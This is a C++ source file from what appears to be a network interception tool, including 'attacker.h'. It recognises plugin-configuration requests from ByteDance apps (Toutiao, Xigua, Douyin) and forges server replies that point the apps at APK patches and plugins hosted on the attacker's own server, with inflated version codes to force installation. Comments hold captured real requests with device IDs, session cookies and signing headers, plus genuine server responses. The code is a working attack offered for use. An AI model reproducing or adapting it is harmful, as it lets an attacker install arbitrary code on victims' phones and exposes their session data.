

#include "ToutiaoPlugin.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../attacker.h"
#include "PluginServer.h"
#include "../HttpUtils.h"

/*
POST /api/plugin/config/v1/?mcc_mnc=46011&iid=65607334373&device_id=57758507195&ac=wifi&channel=oppo&aid=1128&app_name=aweme&version_code=530&version_name=5.3.0&device_platform=android&ssmix=a&device_type=OPPO+A57&device_brand=OPPO&language=zh&os_api=23&os_version=6.0.1&uuid=A00000611E3E28&openudid=12dc3c0630e77825&manifest_version_code=530&resolution=720*1280&dpi=320&update_version_code=5302&_rticket=1552794212763 HTTP/1.1
Host: lf-hl.snssdk.com
Connection: keep-alive
Content-Length: 134
Cookie: install_id=65607334373; ttreq=1$9451e1e09f24e4b086b228775be207a6d56513ee
Accept-Encoding: gzip
Content-Encoding: gzip
X-SS-REQ-TICKET: 1552794212813
sdk-version: 1
Content-Type: application/json; charset=utf-8
X-SS-STUB: 8B84D86121B0783A0A745AF2E779BFCB
User-Agent: com.ss.android.ugc.aweme/530 (Linux; U; Android 6.0.1; zh_CN; OPPO A57; Build/MMB29M; Cronet/58.0.2991.0)
X-Gorgon: 0300842d000096c62821f0b2e6ff78c90c23ddf4d27187a9aa52
X-Khronos: 1552794214
X-Pods:


POST /api/plugin/config/v1/?mcc_mnc=46011&iid=65607334373&device_id=57758507195&ac=wifi&channel=oppo&aid=1128&app_name=aweme&version_code=530&version_name=5.3.0&device_platform=android&ssmix=a&device_type=OPPO+A57&device_brand=OPPO&language=zh&os_api=23&os_version=6.0.1&uuid=A00000611E3E28&openudid=12dc3c0630e77825&manifest_version_code=530&resolution=720*1280&dpi=320&update_version_code=5302&_rticket=1552817784370 HTTP/1.1
Host: is-hl.snssdk.com
Connection: keep-alive
Content-Length: 134
Cookie: install_id=65607334373; ttreq=1$9451e1e09f24e4b086b228775be207a6d56513ee; odin_tt=83f15d1edaa00c8713da3dbd5a40839c17804951b3754d2d4a6b6ddf9d14d22ce5b9d2c550d06d63aa4294d3a1091521; qh[360]=1
Accept-Encoding: gzip
Content-Encoding: gzip
X-SS-REQ-TICKET: 1552817784425
sdk-version: 1
Content-Type: application/json; charset=utf-8
X-SS-STUB: 8B84D86121B0783A0A745AF2E779BFCB
User-Agent: com.ss.android.ugc.aweme/530 (Linux; U; Android 6.0.1; zh_CN; OPPO A57; Build/MMB29M; Cronet/58.0.2991.0)
X-Gorgon: 0300842d0000c6943d96f0b2e6a295318e70ddf4d271479ee1d7
X-Khronos: 1552817785
X-Pods:

ssl client data:
*/

/*
POST /api/plugin/config/v1/?iid=65910775097&device_id=57758507195&ac=wifi&channel=oppo&aid=32&app_name=video_article&version_code=740&version_name=7.4.0&device_platform=android&ab_version=668859%2C787371%2C769770%2C782845%2C668855%2C783593%2C785219%2C668858%2C780790%2C788536%2C721977%2C769832%2C661920%2C780007%2C784413%2C780950%2C777418%2C781250%2C780514%2C785548%2C756352%2C772789%2C548493%2C766020%2C374103%2C708328%2C643915%2C763128%2C557636%2C726218%2C734850%2C691962%2C736872%2C788073%2C785625%2C740413%2C779940%2C782428%2C770516%2C782774%2C788535%2C673593%2C631608%2C752143%2C740257%2C785724%2C788997%2C668854%2C768852%2C787920%2C703580%2C668852%2C668856%2C668853%2C770579%2C668851%2C457536&ssmix=a&device_type=OPPO+A57&device_brand=OPPO&language=zh&os_api=23&os_version=6.0.1&uuid=A00000611E3E28&openudid=12dc3c0630e77825&manifest_version_code=340&resolution=720*1280&dpi=320&update_version_code=74004&_rticket=1552794219978&rom_version=coloros_V3.0_A57_11_A.17_170423 HTTP/1.1
X-SS-STUB: 055E8ABC8A0E360E790E2CBAE2AE4F7F
Accept-Encoding: gzip
Content-Encoding: gzip
X-SS-REQ-TICKET: 1552794219981
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M) VideoArticle/7.4.0 ok/3.10.0.2
Cookie: install_id=65910775097; ttreq=1$14f36dd0fc86c0dbc9f8bb0b77296684384601ff; odin_tt=fb171f81c4b9cd53cbe656ea0287d1709dfb02ce1601704d6ba501c9432e1a7d69fe9fa987627a17cc696fe22c5273ca
Content-Type: application/json; charset=utf-8
Content-Length: 240
Host: security-hl.snssdk.com
Connection: Keep-Alive
*/

/*
POST /api/plugin/config/v1/?iid=65910775097&device_id=57758507195&ac=wifi&channel=oppo&aid=32&app_name=video_article&version_code=740&version_name=7.4.0&device_platform=android&ab_version=668859%2C787371%2C769770%2C782845%2C668855%2C783593%2C785219%2C668858%2C780790%2C788536%2C721977%2C769832%2C661920%2C780007%2C784413%2C780950%2C777418%2C781250%2C780514%2C785548%2C756352%2C772789%2C548493%2C766020%2C374103%2C708328%2C643915%2C763128%2C557636%2C726218%2C734850%2C691962%2C736872%2C788073%2C785625%2C740413%2C779940%2C782428%2C770516%2C782774%2C788535%2C673593%2C631608%2C752143%2C740257%2C785724%2C788997%2C668854%2C768852%2C787920%2C703580%2C668852%2C668856%2C668853%2C770579%2C668851%2C457536&ssmix=a&device_type=OPPO+A57&device_brand=OPPO&language=zh&os_api=23&os_version=6.0.1&uuid=A00000611E3E28&openudid=12dc3c0630e77825&manifest_version_code=340&resolution=720*1280&dpi=320&update_version_code=74004&_rticket=1552794259147&fp=w2T_cSFIJ2HSFlTrLlU1F2KePMKe&rom_version=coloros_V3.0_A57_11_A.17_170423 HTTP/1.1
X-SS-STUB: 2EAFDCDDA8030576729D1B04B15AF7E3
Accept-Encoding: gzip
Content-Encoding: gzip
X-SS-REQ-TICKET: 1552794259219
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M) VideoArticle/7.4.0 ok/3.10.0.2
Cookie: install_id=65910775097; ttreq=1$14f36dd0fc86c0dbc9f8bb0b77296684384601ff; odin_tt=fb171f81c4b9cd53cbe656ea0287d1709dfb02ce1601704d6ba501c9432e1a7d69fe9fa987627a17cc696fe22c5273ca; qh[360]=1
Content-Type: application/json; charset=utf-8
Content-Length: 260
Host: security-hl.snssdk.com
Connection: Keep-Alive


*/
int gFlag = 0;


int ToutiaoPlugin::isToutiaoPlugin(const char * lpurl, const char * szdn) {


	if (strstr(szdn, "snssdk.com") || strstr(szdn, "security.snssdk.com") || strstr(szdn, "security-hl.snssdk.com")) {
		if (strstr(lpurl, "/api/plugin/config/"))
		{
			if (strstr(lpurl,"&app_name=video_article&") )
			{
				gFlag = 2;
				return 2;
			}
			else if(strstr(lpurl,"&app_name=news_article&"))
			{
				gFlag = 1;
				return 1;
			}
			else if (strstr(lpurl, "&app_name=aweme&")) {
				gFlag = 3;
				return 3;
			}
			else
			{
				gFlag = 1;
				return 1;
			}
		}
	}

	return FALSE;
}









int makeXiguaReply(char * lpbuffer, int bufsize, int buflimit, string username) {
	int ret = 0;

	int fullversion = 9400407;	//7400407

	int version = 94004;

	int version2 = 999;//175

	string patchname = "xigua9400407";		//xigua_74004

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string apkfilename = "xigua_patch.apk";

	string apkfilename2 = "xigua_cronet.apk";

	char szfilemd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	string filename = Public::getUserPluginPath(username) + apkfilename;
	ret = CryptoUtils::getUpdateFileMd5(filename, szfilemd5, hexmd5, TRUE);

	char szfile2md5[256] = { 0 };
	string filename2 = Public::getUserPluginPath(username) + apkfilename2;
	ret = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hexmd5, TRUE);

	char * lpRespContentFormat =
		"{\"data\":{\"patch\":"
		"[{\"patch_name\":\"%s\",\"versioncode\":%u,"
		"\"url\":\"http://%s/%s\","
		"\"backup_urls\":[\"\",\"\"],\"md5\":\"%s\",\"offline\":false,\"wifionly\":false,\"update_version_code\":%u}],"
		"\"plugin\":[{\"packagename\":\"com.bytedance.common.plugin.cronet\",\"versioncode\":%u,"
		"\"url\":\"http://%s/%s\","
		"\"backup_urls\":[\"\",""\"\"],"
		"\"md5\":\"%s\",\"patch_url\":\"\",\"patch_md5\":\"\",\"offline\":false,\"revert\":false,"
		"\"wifionly\":false,\"Order\":99,\"download_type\":0,\"clientversion_min\":72600,\"clientversion_max\":0}]},"
		"\"message\":\"success\"}";

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		patchname.c_str(), fullversion, strip.c_str(), apkfilename.c_str(), szfilemd5, version,
		version2,strip.c_str(),apkfilename2.c_str(),szfile2md5);

	int respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return respsize;
}


int makeToutiaoReply(char * lpbuffer, int bufsize, int buflimit, string username) {
	int ret = 0;

	int apk1ver = 999;	//296
	int apk2ver = 999;	//116
	int apk3ver = 9160000;	//7160000

	string apkfn1 = "toutiao_ttm.apk";

	string apkfn2 = "toutiao_cronet.apk";

	string apkfn3 = "toutiao_tt.apk";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	char szfile1md5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	string filename1 = Public::getUserPluginPath(username) + apkfn1;
	ret = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hexmd5, TRUE);

	char szfile2md5[256] = { 0 };
	string filename2 = Public::getUserPluginPath(username) + apkfn2;
	ret = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hexmd5, TRUE);

	char szfile3md5[256] = { 0 };
	string filename3 = Public::getUserPluginPath(username) + apkfn3;
	ret = CryptoUtils::getUpdateFileMd5(filename3, szfile3md5, hexmd5, TRUE);

	char * lpRespContentFormat =
	"{\"data\":{\"config\":{\"auto_request_interval\":0,\"transparent_field\":\"\"},\"plugin\":"
	"[{\"packagename\":\"com.ss.ttm\",\"versioncode\":%u,\"url\":\"http://%s/%s\",\"backup_urls\":[\"\",\"\"],\"md5\":\"%s\","
	"\"patch_url\":\"\",\"patch_md5\":\"\",\"offline\":false,\"revert\":false,\"wifionly\":false,\"Order\":201,\"download_type\":0,\"clientversion_min\":6340,\"clientversion_max\":0},"
	"{\"packagename\":\"com.bytedance.common.plugin.cronet\",\"versioncode\":%u,\"url\":\"http://%s/%s\",\"backup_urls\":[\"\",\"\"],\"md5\":\"%s\",\"patch_url\":\"\","
	"\"patch_md5\":\"\",\"offline\":false,\"revert\":false,\"wifionly\":true,\"Order\":100,\"download_type\":0,\"clientversion_min\":71500,\"clientversion_max\":0},"
	"{\"packagename\":\"com.bytedance.ugc.medialib.tt\",\"versioncode\":%u,\"url\":\"http://%s/%s\",\"backup_urls\":[\"\",\"\"],\"md5\":\"%s\","
	"\"patch_url\":\"\",\"patch_md5\":\"\",\"offline\":false,\"revert\":false,\"wifionly\":false,\"Order\":95,\"download_type\":0,\"clientversion_min\":71600,\"clientversion_max\":71699}]},\"message\":\"success\"}";

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		apk1ver, strip.c_str(), apkfn1.c_str(), szfile1md5,
		apk2ver, strip.c_str(), apkfn2.c_str(), szfile2md5,
		apk3ver, strip.c_str(), apkfn3.c_str(), szfile3md5);

	int respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return respsize;
}

int makeAweReply(char * lpbuffer, int bufsize, int buflimit, string username) {
	int ret = 0;
	return ret;
}

int ToutiaoPlugin::makeToutiaoPluginConfig(char * lpbuffer, int bufsize, int buflimit, string username) {
	int ret = 0;
	if (gFlag == 1)
	{
		ret = makeToutiaoReply(lpbuffer, bufsize, buflimit, username);
	}
	else if (gFlag == 2)
	{
		ret = makeXiguaReply(lpbuffer, bufsize, buflimit, username);
	}else if (gFlag == 3)
	{
		ret = makeAweReply(lpbuffer, bufsize, buflimit, username);
	}

	return ret;
}
/*
{"plugin":[{"packagename":"com.bytedance.common.plugin.cronet","versioncode":106,"maxversion":2147483647,"minversion":106},
{"packagename":"com.ss.ijkplayer","versioncode":2,"maxversion":2147483647,"minversion":0},
{"packagename":"com.ss.android.flutter","versioncode":-1,"maxversion":2147483647,"minversion":9},
{"packagename":"com.bytedance.ugc.medialib.tt","versioncode":7050000,"maxversion":2147483647,"minversion":7020000},
{"packagename":"com.ss.android.diamond","versioncode":7071001,"maxversion":2147483647,"minversion":7071001},
{"packagename":"com.ss.android.dynamicdocker","versioncode":7040003,"maxversion":2147483647,"minversion":6700002},
{"packagename":"com.ixigua.live.pushstream","versioncode":-1,"maxversion":2147483647,"minversion":5},
{"packagename":"com.ss.ttm.upload","versioncode":11,"maxversion":2147483647,"minversion":11},
{"packagename":"com.ss.android.crash","versioncode":-1,"maxversion":2147483647,"minversion":0},
{"packagename":"com.ss.android.im","versioncode":702000,"maxversion":2147483647,"minversion":702000},
{"packagename":"com.ss.android.reactnative","versioncode":707001,"maxversion":2147483647,"minversion":707000},
{"packagename":"com.ss.android.freewifi","versioncode":-1,"maxversion":2147483647,"minversion":0},
{"packagename":"com.ss.ttm.ttpreloader","versioncode":3,"maxversion":2147483647,"minversion":1},
{"packagename":"com.ss.android.livechat","versioncode":702000,"maxversion":2147483647,"minversion":702000},
{"packagename":"com.tt.appbrandplugin","versioncode":70703,"maxversion":2147483647,"minversion":70702},
{"packagename":"com.ss.android.patch","versioncode":-1,"maxversion":2147483647,"minversion":0},
{"packagename":"com.ss.ttm","versioncode":282,"maxversion":2147483647,"minversion":86},
{"packagename":"com.ss.android.adblockfilter","versioncode":696003,"maxversion":2147483647,"minversion":0},
{"packagename":"com.ss.android.tt.vangogh","versioncode":70600,"maxversion":2147483647,"minversion":70001},
{"packagename":"com.ixigua.live.cocos2dx","versioncode":7,"maxversion":2147483647,"minversion":7},
{"packagename":"com.ss.android.substrthen","versioncode":-1,"maxversion":2147483647,"minversion":0},
{"packagename":"com.bytedance.plugin_car_live","versioncode":-1,"maxversion":2147483647,"minversion":700000}],"auto_request":true}
*/


/*
POST /api/plugin/config/v2/?iid=65796232520&device_id=57758507195&ac=wifi&channel=oppo-cpa&aid=13&app_name=news_article
&version_code=716&version_name=7.1.6&device_platform=android
&ab_version=645714%2C607361%2C731482%2C740305%2C774152%2C739591%2C635529%2C739391%2C764921%2C662099%2C775239%2C768975%2C777598%2C771859%2C770465%2C788435%2C753425%2C787303%2C780192%2C717950%2C737334%2C737948%2C788599%2C772057%2C668774%2C773235%2C766806%2C631594%2C775311%2C741711%2C554836%2C765196%2C549647%2C786843%2C782779%2C752138%2C615292%2C779563%2C787965%2C546701%2C780402%2C744817%2C727988%2C770990%2C786988%2C757284%2C625066%2C652953%2C759202%2C731481%2C747886%2C777817%2C770312%2C782137%2C779500%2C679101%2C777763%2C735201%2C782545%2C787597%2C767991%2C725676%2C779958%2C785274%2C784801%2C788544%2C780078%2C738576%2C755478%2C776680%2C787144%2C660830%2C768221%2C773488%2C754087%2C787419%2C677770%2C787781%2C775937%2C341313%2C770569%2C662176%2C762214%2C775728%2C776855%2C665173%2C674054%2C751912%2C770485%2C691933%2C170988%2C643890%2C778347%2C374119%2C783987%2C782518%2C736955%2C718154%2C785976%2C781013%2C674790%2C550042%2C784481%2C785620%2C783181%2C776265%2C784645%2C649428%2C614099%2C677129%2C522765%2C776034%2C773039%2C416055%2C716149%2C710077%2C684976%2C707372%2C693246%2C785814%2C603442%2C787728%2C784560%2C788756%2C787022%2C767350%2C773096%2C783645%2C700821%2C603385%2C603398%2C603403%2C603406%2C777728%2C661904%2C742450%2C769177%2C668775%2C737591%2C782074%2C768904%2C759151%2C788013%2C788270%2C786734%2C729159%2C778113%2C787714%2C784347%2C690896%2C759293%2C661781%2C457480%2C649400%2C783762%2C776074
&ab_group=94565%2C102756%2C181429&ab_feature=102756%2C94565
&ssmix=a&device_type=OPPO+A57&device_brand=OPPO&language=zh&os_api=23&os_version=6.0.1
&uuid=A00000611E3E28&openudid=12dc3c0630e77825&manifest_version_code=716&resolution=720*1280&dpi=320&update_version_code=71611
&_rticket=1552788585164&plugin=0&rom_version=coloros_v3.0_a57_11_a.17_170423&ts=1552788585&as=a2c55a58d9a6bcfc7d0377
&mas=00609f6a040bb60aa7d1bd76694d03ec8fa888e06604282ad3 HTTP/1.1
X-SS-STUB: 6CE59C4A349D4F655034C23163BC3E5B
Accept-Encoding: gzip
Content-Encoding: gzip
X-SS-REQ-TICKET: 1552788585239
sdk-version: 1
Cookie: install_id=65796232520; ttreq=1$010e76c6cbd66ef82a7139b6f40a4c12dedfbb2c; qh[360]=1; odin_tt=f55d5a42d8499e457b7fbc51ef75ba14b8c15f456006e019f300c25a94416891ca0bfd266f96298f0dc40559fc5b118f
X-Gorgon: 0300bdbd0000265c49a014411b29eb2881b28d0b7796abe8e70b
X-Khronos: 1552788586
X-Pods:
Content-Type: application/json; charset=utf-8
Content-Length: 373
Host: security.snssdk.com
Connection: Keep-Alive
User-Agent: okhttp/3.10.0.1

{"data":{"config":{"auto_request_interval":0,"transparent_field":""},"plugin":
[{"packagename":"com.ss.ttm","versioncode":296,"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/5e5476f55d95f4c7de711809307c6149",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/5e5476f55d95f4c7de711809307c6149",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/5e5476f55d95f4c7de711809307c6149"],
"md5":"5e5476f55d95f4c7de711809307c6149","patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,"Order":201,"download_type":0,
"clientversion_min":6340,"clientversion_max":0},{"packagename":"com.ss.ttm.ttpreloader","versioncode":3,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/9edc1315c9cda910cd8a108779e5b78b","backup_urls":
["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/9edc1315c9cda910cd8a108779e5b78b",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/9edc1315c9cda910cd8a108779e5b78b"],
"md5":"9edc1315c9cda910cd8a108779e5b78b","patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":true,"Order":102,"download_type":0,
"clientversion_min":65000,"clientversion_max":99999},{"packagename":"com.ss.ijkplayer","versioncode":2,
"url":"https://s3.pstatp.com/site/download/plugin_patch/plugin/c346702aec1b91fbbc081bf5b7473cf0",
"backup_urls":["https://s1.pstatp.com/site/download/plugin_patch/plugin/c346702aec1b91fbbc081bf5b7473cf0",
"https://s6.pstatp.com/site/download/plugin_patch/plugin/c346702aec1b91fbbc081bf5b7473cf0"],
"md5":"c346702aec1b91fbbc081bf5b7473cf0","patch_url":"","patch_md5":"","offline":false,
"revert":false,"wifionly":false,"Order":100,"download_type":0,"clientversion_min":5880,"clientversion_max":0},
{"packagename":"com.bytedance.common.plugin.cronet","versioncode":116,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/73acb93b93b2895f0dd587f9586235e5",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/73acb93b93b2895f0dd587f9586235e5",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/73acb93b93b2895f0dd587f9586235e5"],"md5":"73acb93b93b2895f0dd587f9586235e5",
"patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":true,"Order":100,
"download_type":0,"clientversion_min":71500,"clientversion_max":0},{"packagename":"com.ss.ttm.upload","versioncode":14,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/af271d0822dff87b70744cd26053229b",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/af271d0822dff87b70744cd26053229b",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/af271d0822dff87b70744cd26053229b"],"md5":"af271d0822dff87b70744cd26053229b",
"patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,"Order":99,"download_type":0,"clientversion_min":71104,
"clientversion_max":99999},{"packagename":"com.bytedance.ugc.medialib.tt","versioncode":7160000,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/ecffe24407a2be318b9958131f1051f1",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/ecffe24407a2be318b9958131f1051f1",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/ecffe24407a2be318b9958131f1051f1"],
"md5":"ecffe24407a2be318b9958131f1051f1","patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,
"Order":95,"download_type":0,"clientversion_min":71600,"clientversion_max":71699},
{"packagename":"com.ss.android.dynamicdocker","versioncode":7140000,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/450b7a0aad09a6394f8971721565b626",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/450b7a0aad09a6394f8971721565b626",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/450b7a0aad09a6394f8971721565b626"],"md5":"450b7a0aad09a6394f8971721565b626",
"patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,"Order":80,"download_type":0,"clientversion_min":71400,
"clientversion_max":0},{"packagename":"com.ss.android.livechat","versioncode":714000,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/e8341cb31bd946d8efcf4ff0d7104b2f",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/e8341cb31bd946d8efcf4ff0d7104b2f",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/e8341cb31bd946d8efcf4ff0d7104b2f"],
"md5":"e8341cb31bd946d8efcf4ff0d7104b2f","patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,"Order":70,
"download_type":0,"clientversion_min":71400,"clientversion_max":0},{"packagename":"com.tt.appbrandplugin","versioncode":71603,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/ef43dfd195c4cb0cb28ad6fd7154e174",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/ef43dfd195c4cb0cb28ad6fd7154e174",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/ef43dfd195c4cb0cb28ad6fd7154e174"],
"md5":"ef43dfd195c4cb0cb28ad6fd7154e174","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":50,"download_type":0,"clientversion_min":71600,"clientversion_max":71699},
{"packagename":"com.ss.android.im","versioncode":713000,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/2f01258e934d325febfdbb66506be9e6",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/2f01258e934d325febfdbb66506be9e6",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/2f01258e934d325febfdbb66506be9e6"],
"md5":"2f01258e934d325febfdbb66506be9e6","patch_url":"","patch_md5":"",
"offline":false,"revert":false,"wifionly":false,"Order":45,"download_type":0,"clientversion_min":71300,
"clientversion_max":0},{"packagename":"com.ss.android.adblockfilter","versioncode":715001,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/627cac86dc446054cf81301e6fa1bb17",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/627cac86dc446054cf81301e6fa1bb17",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/627cac86dc446054cf81301e6fa1bb17"],
"md5":"627cac86dc446054cf81301e6fa1bb17","patch_url":"","patch_md5":"","offline":false,
"revert":false,"wifionly":false,"Order":43,"download_type":0,"clientversion_min":71500,
"clientversion_max":0},{"packagename":"com.ss.android.reactnative","versioncode":716001,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/2b159e6ef3921ae021593b52da006a4e",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/2b159e6ef3921ae021593b52da006a4e",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/2b159e6ef3921ae021593b52da006a4e"],
"md5":"2b159e6ef3921ae021593b52da006a4e","patch_url":"","patch_md5":"","offline":false,
"revert":false,"wifionly":false,"Order":21,"download_type":0,"clientversion_min":71600,
"clientversion_max":71699},{"packagename":"com.ixigua.live.cocos2dx","versioncode":7,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/24b1f295d0641ff316d6fc35416ce728",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/24b1f295d0641ff316d6fc35416ce728",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/24b1f295d0641ff316d6fc35416ce728"],
"md5":"24b1f295d0641ff316d6fc35416ce728","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":3,"download_type":0,"clientversion_min":68300,"clientversion_max":0},
{"packagename":"com.ixigua.live.pushstream","versioncode":19,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/34970116d3d8348aa71d92a2d2d47afd",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/34970116d3d8348aa71d92a2d2d47afd",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/34970116d3d8348aa71d92a2d2d47afd"],
"md5":"34970116d3d8348aa71d92a2d2d47afd","patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,
"Order":1,"download_type":2,"clientversion_min":71100,"clientversion_max":0}]},"message":"success"}
*/


/*
{"data":{"config":{"auto_request_interval":0},
"plugin":[{"packagename":"com.ss.android.substrthen","versioncode":1,
"url":"https://s3.pstatp.com/site/download/plugin_patch/plugin/8faf2289ad99c1a0dbb94ac3e37bba87",
"backup_urls":["https://s1.pstatp.com/site/download/plugin_patch/plugin/8faf2289ad99c1a0dbb94ac3e37bba87",
"https://s6.pstatp.com/site/download/plugin_patch/plugin/8faf2289ad99c1a0dbb94ac3e37bba87"],
"md5":"8faf2289ad99c1a0dbb94ac3e37bba87","patch_url":"","patch_md5":"","offline":true,
"revert":false,"wifionly":true,"Order":20,"download_type":0,"clientversion_min":6360,"clientversion_max":99999},
{"packagename":"com.ixigua.live.pushstream","versioncode":17,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/913b72abd089ebd895ecd226289e4acc",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/913b72abd089ebd895ecd226289e4acc",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/13/913b72abd089ebd895ecd226289e4acc"],
"md5":"913b72abd089ebd895ecd226289e4acc",
"patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,"Order":1,"download_type":2,
"clientversion_min":70300,"clientversion_max":0}]},"message":"success"}
*/




/*
{"data":{"patch":[{"patch_name":"xigua_74004","versioncode":7400407,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/hotfix/32/163cf12cecb911bd8f5861ec8c8ae351",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/hotfix/32/163cf12cecb911bd8f5861ec8c8ae351",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/hotfix/32/163cf12cecb911bd8f5861ec8c8ae351"],
"md5":"163cf12cecb911bd8f5861ec8c8ae351","offline":false,"wifionly":false,"update_version_code":74004}],
"plugin":[{"packagename":"com.ss.ttm","versioncode":299,"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/5267ac35d7169cc0f28290f1919e99b2",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/5267ac35d7169cc0f28290f1919e99b2",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/5267ac35d7169cc0f28290f1919e99b2"],
"md5":"5267ac35d7169cc0f28290f1919e99b2","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":201,"download_type":0,"clientversion_min":64400,"clientversion_max":0},
{"packagename":"com.xigua.ttm.ttpreloader","versioncode":3,"url":
"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/5a63e5fbc8facda7ae9085d477641f27",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/5a63e5fbc8facda7ae9085d477641f27",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/5a63e5fbc8facda7ae9085d477641f27"],
"md5":"5a63e5fbc8facda7ae9085d477641f27","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":true,"Order":100,"download_type":0,"clientversion_min":64400,"clientversion_max":0},
{"packagename":"com.ss.android.xyvodp2p","versioncode":1550,"url":
"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/8341703c65efde2a7b7acfba47fbe33c",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/8341703c65efde2a7b7acfba47fbe33c",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/8341703c65efde2a7b7acfba47fbe33c"],
"md5":"8341703c65efde2a7b7acfba47fbe33c","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":100,"download_type":0,"clientversion_min":70000,"clientversion_max":0},
